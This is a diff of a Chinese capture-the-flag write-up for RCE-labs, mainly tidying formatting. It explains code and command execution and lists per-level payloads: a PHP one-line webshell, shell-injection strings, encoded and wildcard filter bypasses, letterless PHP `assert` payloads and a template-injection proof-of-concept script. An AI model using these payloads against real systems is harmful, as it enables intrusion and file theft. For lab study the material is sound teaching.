@@ -47,13 +47,13 @@
 
 打开题目即可得Flag，没有什么可以说的，作为第一个关卡主要是用于理解两者的区别。
 
-**「任意代码执行(Arbitrary Code Execution,ACE)」** 是指攻击者在目标计算机或目标进程中运行攻击者选择的任何命令或代码的能力，这是一个广泛的概念，它涵盖了任何类型的代码运行过程，不仅包括系统层面的脚本或程序，也包括应用程序内部的函数或方法调用。
+**「任意代码执行 (Arbitrary Code Execution, ACE)」** 是指攻击者在目标计算机或目标进程中运行攻击者选择的任何命令或代码的能力，这是一个广泛的概念，它涵盖了任何类型的代码运行过程，不仅包括系统层面的脚本或程序，也包括应用程序内部的函数或方法调用。
 
-在此基础上我们将通过网络触发任意代码执行的能力通常称为 远程代码执行 **「远程代码执行(RCE,Remote Code Execution,RCE)」**。
+在此基础上我们将通过网络触发任意代码执行的能力通常称为 **「远程代码执行 (Remote Code Execution, RCE)」**。
 
-**「命令执行(Command Execution)」** 通常指的是在操作系统层面上执行预定义的指令或脚本。这些命令最终的指向通常是系统命令，如Windows中的CMD命令或Linux中的Shell命令，这在语言中可以体现为一些特定的函数或者方法调用，如PHP中的`shell_exec()`函数或Python中的`os.system()`函数。
+**「命令执行 (Command Execution)」** 通常指的是在操作系统层面上执行预定义的指令或脚本。这些命令最终的指向通常是系统命令，如Windows中的CMD命令或Linux中的Shell命令，这在语言中可以体现为一些特定的函数或者方法调用，如PHP中的`shell_exec()`函数或Python中的`os.system()`函数。
 
-**「代码执行(Code Execution)」** 同我们最开始说到的任意代码执行，在语言中可以体现为一些函数或者方法调用，如PHP中的`eval()`函数或Python中的`exec()`函数。
+**「代码执行 (Code Execution)」** 同我们最开始说到的任意代码执行，在语言中可以体现为一些函数或者方法调用，如PHP中的`eval()`函数或Python中的`exec()`函数。
 
 在该题目中：
 
@@ -67,20 +67,20 @@
 
 概念已经在题目引导部分做出解释：
 
-> 「代码执行(Code Execution)」 在某个语言中，通过一些方式(通常为函数或者方法调用)执行该语言的任意代码的行为，如PHP中的`eval()`函数或Python中的`exec()`函数。
-> 当漏洞入口点可以执行任意代码时，我们称其为代码执行漏洞 —— 这种漏洞包含了通过语言中对接系统命令的函数来执行系统命令的情况，比如 eval("system('cat /etc/passwd')";); 也被归为代码执行漏洞。
+> 「代码执行 (Code Execution)」 在某个语言中，通过一些方式（通常为函数或者方法调用）执行该语言的任意代码的行为，如PHP中的`eval()`函数或Python中的`exec()`函数。  
+> 当漏洞入口点可以执行任意代码时，我们称其为代码执行漏洞 —— 这种漏洞包含了通过语言中对接系统命令的函数来执行系统命令的情况，比如 `eval("system('cat /etc/passwd');");` 也被归为代码执行漏洞。
 
-题目给了一个常见的一句话木马，其需要传递的参数为 a ，使用POST的方法传递。
+题目给了一个常见的一句话木马，其需要传递的参数为 `a` ，使用POST的方法传递。
 
-由于题目包含了 get_flag.php 所以我们直接在执行点输出flag就行：
+由于题目包含了 `get_flag.php`，所以我们直接在执行点输出flag就行：
 
 **POST**：`a=echo $flag;`
 
-当然，一句话木马支持Webshell管理工具进行链接，通常情况下链接密码为提交的参数(蚁剑)。
+当然，一句话木马支持Webshell管理工具进行链接，通常情况下链接密码为提交的参数（如蚁剑）。
 
 ### Level 2 : PHP代码执行函数 
 
-首先通过发送 GET：/?action= 去随机的获取一个函数，然后通过 GET：/?action=submit + POST：content=<函数参数>的方法完成题目。
+首先通过发送 GET：`/?action=` 去随机的获取一个函数，然后通过往 `/?action=submit` 路由 POST：`content=<函数参数>` 的方法完成题目。
 
 通过源码可以看到最后我们的提交会组合为一个函数去调用： `eval(funciton(content))`
 
@@ -109,7 +109,7 @@
 
 同之前的 Level 1 : 一句话木马和代码执行  关卡一致，只不过这里的入口换成了system.
 
-system() 函数会通过sh软连接执行你输入的系统命令。
+`system()` 函数会通过sh软连接执行你输入的系统命令。
 
 **POST**：`a=cat /flag`
 
@@ -122,9 +122,9 @@ system() 函数会通过sh软连接执行你输入的系统命令。
 | 运算符               | 说明                                                         | 示例代码                                                     |
 | -------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
 | `&&`（逻辑与运算符） | AND操作 只有当第一个命令 `cmd_1` 执行成功（返回值为 0）时，才会执行第二个命令 `cmd_2`。 | `mkdir new_folder && cd new_folder` （只有在新建文件夹成功后才进入该文件夹） |
-| `||`（逻辑或运算符） | OR操作 只有当第一个命令 `cmd_1` 执行失败（返回值不为 0）时，才会执行第二个命令 `cmd_2`。 | `mkdir new_folder ||echo "Folder exists"` （如果创建文件夹失败，则输出 "Folder exists"） |
+| `\|\|`（逻辑或运算符） | OR操作 只有当第一个命令 `cmd_1` 执行失败（返回值不为 0）时，才会执行第二个命令 `cmd_2`。 | `mkdir new_folder \|\|echo "Folder exists"` （如果创建文件夹失败，则输出 "Folder exists"） |
 | `&`（后台运行符）    | 将命令 `cmd_1` 放到后台执行，Shell 立即执行 `cmd_2`，两个命令并行执行。 | `sleep 10 & echo "This will run immediately."`               |
-| `;`（命令分隔符）    | 无论前一个命令 `cmd_1` 是否成功，都会执行下一个命令 `cmd_2`。这允许将命令堆叠在一起。命令会依次执行。 | `echo "Hello" & echo "World"` （先输出 "Hello"，再输出 "World"） |
+| `;`（命令分隔符）    | 无论前一个命令 `cmd_1` 是否成功，都会执行下一个命令 `cmd_2`。这允许将命令堆叠在一起。命令会依次执行。 | `echo "Hello"; echo "World"` （先输出 "Hello"，再输出 "World"） |
 
 所以只需要在输入的时候 在后面利用连接符拼接我们想要执行的命令即可：
 
@@ -137,7 +137,7 @@ GET 下面几种均可：
 
 ?ip=;cat /flag
 
-?ip=&cat /flag #&需要URL编码
+?ip=&cat /flag  # &需要URL编码
 ```
 
 扩展：其他Shell符号：
@@ -145,9 +145,9 @@ GET 下面几种均可：
 | 操作符                                                       | 结果                                                         | 示例                                                         |
 | ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |
 | `command1 > command2` <br />`command1 < command2` <br />`command1 >> command2` | 这些操作符是重定向操作符。它们用于重定向输入或输出。         | `echo "Hello" > output.txt` （将 "Hello" 写入到 output.txt 文件） <br />`cat < input.txt` （读取 input.txt 的内容并在终端显示）<br /> `echo "Hello" >> output.txt` （将 "Hello" 追加到 output.txt 文件中） |
-| `` `command2` ``                                             | 反引号将一个单独的命令封装在原始命令处理的数据中。           | echo "Today is \`date\`"（将日期命令的输出嵌入到 "Today is" 之后） |
-| `command1 | command2`                                        | 管道可用于将多个命令链接起来。一个命令的输出会被重定向到下一个命令中。 | `ls -l | grep ".txt"` （列出所有以 .txt 结尾的文件）         |
-| `$(command2)`                                                | $ 符号执行括号内的命令。                                     | `echo "Today is $(date)"` （将日期命令的输出嵌入到 "Today is" 之后） |
+| `` `command2` ``                                             | 反引号将一个单独的命令封装在原始命令处理的数据中。           | `` echo "Today is \`date\`" ``（将日期命令的输出嵌入到 "Today is" 之后） |
+| `command1 \| command2`                                        | 管道可用于将多个命令链接起来。一个命令的输出会被重定向到下一个命令中。 | `ls -l \| grep ".txt"` （列出所有以 .txt 结尾的文件）         |
+| `$(command2)`                                                | `$` 符号执行括号内的命令。                                     | `echo "Today is $(date)"` （将日期命令的输出嵌入到 "Today is" 之后） |
 | `- command`                                                  | 短横线用于向目标命令添加其他操作。                           | `ls -l -h` （列出文件时显示文件大小的可读格式）              |
 
 ### Level 5 - 8: 命令执行 - 终端中的功能/特殊字符
@@ -182,7 +182,7 @@ ${<!-- -->IFS} —— 加一个{}固定了变量名- 同理在后面加个$可�
 **空字符：**
 
 在Shell中，单/双引号 "/' 可以用来定义一个空字符串或保护包含空格或特殊字符的字符串。
-例如：echo "\$"a 会输出 $a，而 echo $a 会输出变量a的值，当只有""则表示空字符串，Shell会忽略它。
+例如：`echo "$"a` 会输出 `$a`，而 `echo $a` 会输出变量 `a` 的值，当只有 `""` 则表示空字符串，Shell会忽略它。
 
 ```
 ?cmd=cat /f''lag
@@ -249,8 +249,8 @@ cat "$(echo 'L2ZsYWc=' | base64 -d)"
 `echo "Y2F0IC9mbGFn"|base64 -d`
 echo "Y2F0IC9mbGFn"|base64 -d|bash
 
-echo -n 636174202f666c6167 | xxd -r -p | bash # 十六进制
-$(printf "\143\141\164\040\057\146\154\141\147\012")# 八进制（or bashfuck）
+echo -n 636174202f666c6167 | xxd -r -p | bash  # 十六进制
+$(printf "\143\141\164\040\057\146\154\141\147\012")  # 八进制（or bashfuck）
 ```
 
 #### level 6 - 通配符
@@ -273,7 +273,7 @@ bash-5.1# echo /???/???
 [b-zA-Z_@#%^&*:{}\-\+<>\"|`;\[\]]
 ```
 
-可以发现，我们可以使用一个字母 a和数字，此时：
+可以发现，我们可以使用一个字母 a 和数字，此时：
 
 ```
 bash-5.1# echo /???/?a?
@@ -289,8 +289,8 @@ bash-5.1# echo /???/?a??64 /??a?
 所以本题可用的payload：
 
 ```
-/???/?a??64 /??a? # 使用 /bin/base64 /flag
-/bin/?a? /??a? # 使用 /bin/cat /flag
+/???/?a??64 /??a?  # 使用 /bin/base64 /flag
+/bin/?a? /??a?  # 使用 /bin/cat /flag
 ```
 
 **扩展 - 读文件的程序**
@@ -300,7 +300,7 @@ bash-5.1# echo /???/?a??64 /??a?
 | `cat`     | 从第一行开始显示内容，并将所有内容输出                       |
 | `tac`     | 从最后一行倒序显示内容，并将所有内容输出                     |
 | `more`    | 根据窗口大小，一页一页地显示文件内容                         |
-| `less`    | 根据窗口大小，显示文件内容，可以使用 [pg dn] 和 [pg up] 翻页 |
+| `less`    | 根据窗口大小，显示文件内容，可以使用键盘上的 [Pg Dn] 和 [Pg Up] 翻页 |
 | `head`    | 用于显示文件的头几行                                         |
 | `tail`    | 用于显示文件的尾几行                                         |
 | `nl`      | 类似于 `cat -n`，显示时输出行号                              |
@@ -318,7 +318,7 @@ bash-5.1# echo /???/?a??64 /??a?
 
 **$IFS**
 
-在终端环境下 空格 被视为一个命令分隔符，本质上由 \$IFS 变量控制，而 $IFS 的默认值是空格，你可以在终端中尝试 `echo $IFS | base64` 可以看到空格的base64编码。
+在终端环境下 空格 被视为一个命令分隔符，本质上由 `$IFS` 变量控制，而 `$IFS` 的默认值是空格，你可以在终端中尝试 `echo $IFS | base64` 可以看到空格的base64编码。
 
 ```
 ?cmd=cat${IFS}/fl""ag
@@ -354,7 +354,7 @@ X=$'cat\x20/flag'&&$X
 ${HOME:0:1}来替代"/"：
 cat /flag ---->>> cat ${HOME:0:1}flag
 
-$(echo . | tr '!-0' '"-1')来替代"/"：
+$(echo . | tr '!-0' '"-1') 来替代"/"：
 cat $(echo . | tr '!-0' '"-1')flag
 ```
 
@@ -375,7 +375,7 @@ cat $(echo . | tr '!-0' '"-1')flag
 | `>>`   | `echo "World" >> file.txt`    | 将 `echo` 的输出以追加方式重定向到 `file.txt`                |
 | `<<`   | `cat << EOF`                  | 将输入的文本作为 `cat` 命令的输入，直到遇到 `EOF` 结束       |
 | `<>`   | `cat <> file.txt`             | 以读写模式打开 `file.txt` 并将其内容作为输入                 |
-| `>|`   | `echo "Override" >| file.txt` | 强制覆盖写入到 `file.txt` 文件，即使它具有写保护             |
+| `>\|`   | `echo "Override" >\| file.txt` | 强制覆盖写入到 `file.txt` 文件，即使它具有写保护             |
 | `: >`  | `: > file.txt`                | 将 `file.txt` 截断为0长度，或创建空文件                      |
 | `>&n`  | `ls >&2`                      | 将 `ls` 的标准输出和错误输出重定向到文件描述符 `n` (如 `2` 为标准错误输出) |
 | `m>&n` | `exec 3>&1`                   | 将文件描述符 `3` 重定向到描述符 `1`，即输出重定向到标准输出  |
@@ -442,7 +442,7 @@ Challenge  Hello-CTF_labs  PHPSerialize-labs  PHPinclude-labs  RCE-labs
 dash: 1: $\154\163: not found
 ```
 
-若 sh 的软连接指向 dash 那么用system函数也类似：
+若 sh 的软连接指向 dash，那么用system函数也类似：
 
 ```
 # $'\154\163'
@@ -669,7 +669,7 @@ idea from ：[【HITCON 2017 - BabyFirst-Revenge-v2】](https://github.com/orang
 | [`shell_exec()`](https://www.php.net/manual/zh/function.shell-exec.php) | `shell_exec()` 函数执行系统命令，但返回一个字符串类型的变量来存储系统命令的执行结果。 | `echo shell_exec('cat /etc/passwd');`                        |
 | [`passthru()`](https://www.php.net/manual/zh/function.passthru.php) | `passthru()` 函数执行系统命令并将执行结果输出到页面中，支持二进制数据。 | `passthru('cat /etc/passwd');`                               |
 | [`popen()`](https://www.php.net/manual/zh/function.popen.php) | `popen()` 函数执行系统命令，但返回一个资源类型的变量，需要配合 `fread()` 函数读取结果。 | `$result = popen('cat /etc/passwd', 'r'); echo fread($result, 100);` |
-| [反引号 \`\`](https://www.php.net/manual/zh/language.operators.execution.php) | 反引号用于执行系统命令，返回一个字符串类型的变量来存储命令的执行结果。**注意：关闭了 [shell_exec()](https://www.php.net/manual/zh/function.shell-exec.php) 时反引号运算符是无效的** | echo \`cat /etc/passwd`                                      |
+| [反引号 \`\`](https://www.php.net/manual/zh/language.operators.execution.php) | 反引号用于执行系统命令，返回一个字符串类型的变量来存储命令的执行结果。**注意：关闭了 [shell_exec()](https://www.php.net/manual/zh/function.shell-exec.php) 时反引号运算符是无效的** | `` echo `cat /etc/passwd` ``                                     |
 
 ### Level 18 : 命令执行 - 环境变量注入 
 
@@ -702,7 +702,6 @@ Level 20 : 文件上传导致的RCE
 
 没有做任何waf 直接上传webshell执行命令即可
 
-![image-20241012101025925](C:\Users\右京\AppData\Roaming\Typora\typora-user-images\image-20241012101025925.png)
 
 Level 21 : 文件包含导致的RCE 
 
@@ -710,7 +709,9 @@ Level 21 : 文件包含导致的RCE
 
 Level 22 : PHP 特性 - 动态调用 
 
+```
 ?a=system&b=cat /flag
+```
 
 Level 23 : PHP 特性 - 自增
 
@@ -718,11 +719,15 @@ Level 23 : PHP 特性 - 自增
 
 Level 24 : PHP 特性 - 无参命令执行 
 
+```
 ?code=var_dump(scandir(current(localeconv())));
+```
 
-得到数组array(6) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(8) "flag.php" [3]=> string(12) "get_flag.php" [4]=> string(9) "index.php" [5]=> string(7) "uploads" } 
+得到数组 `array(6) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(8) "flag.php" [3]=> string(12) "get_flag.php" [4]=> string(9) "index.php" [5]=> string(7) "uploads" }` 
 
+```
 ?code=show_source(array_rand(array_flip(scandir(current(localeconv())))));
+```
 
 `array_rand(array_flip())`，`array_flip()`是交换数组的键和值，`array_rand()`是随机返回一个数组,多刷新几次就出来了
 
@@ -736,17 +741,21 @@ Level 26 : PHP 特性 - 无字母数字的代码执行
 
 第一种是异或
 
+```
 $_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); 
 $__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); 
 $___=$$__;
 $_($___[_]);//assert($_POST[_]);
+```
 
 或者
-
+```
 $_ = "!((%)("^"@[[@[\\";   $__ = "!+/(("^"~{`{|";   $___ = $$__;   $_($___[_]); 
+```
 
 第二种是取反
 
+```
 $_ = ~"%9e%8c%8c%9a%8d%8b";   //得到assert，此时$_="assert"_
 
 _$__ = ~"%a0%af%b0%ac%ab";   //得到_POST，此时$__="_POST"___
@@ -754,8 +763,9 @@ _$__ = ~"%a0%af%b0%ac%ab";   //得到_POST，此时$__="_POST"___
 ___$___ = $$__;   //$___=$_POST_
 
 _$_($___[_]); 
+```
 
-方法三:自增自减
+方法三：自增自减
 
 ```
 <?php
@@ -794,7 +804,9 @@ $___($_[_]);   //ASSERT($POST[_])
 code=?><?=`??? ???`?>
 ```
 
+```
 code=?><?=`??? ???/???/????/???_????.???`?>
+```
 
 都抓不到flag 或者get_flag.php
 
@@ -802,8 +814,9 @@ Level 27 : PHP - 模板注入导致的RCE
 
 idekctf 2024 [idekCTF 2024 报道 - Hamayan Hamayan](https://blog.hamayanhamayan.com/entry/2024/08/20/092636)
 
-偷的别人的poc[Idek ctf 2024 网络文章（后续） (zenn.dev)](https://zenn.dev/tchen/articles/83f26ca77948fa)
+偷的别人的 poc [Idek ctf 2024 网络文章（后续） (zenn.dev)](https://zenn.dev/tchen/articles/83f26ca77948fa)
 
+```python
 import hashlib
 import requests
 from urllib.parse import quote
@@ -827,3 +840,4 @@ template_c_file_path = "../templates_c/" + template_c_file
 w2 = requests.get(URL + "?page=" + template_c_file_path)
 print(w2.status_code)
 print(w2.text)
+```
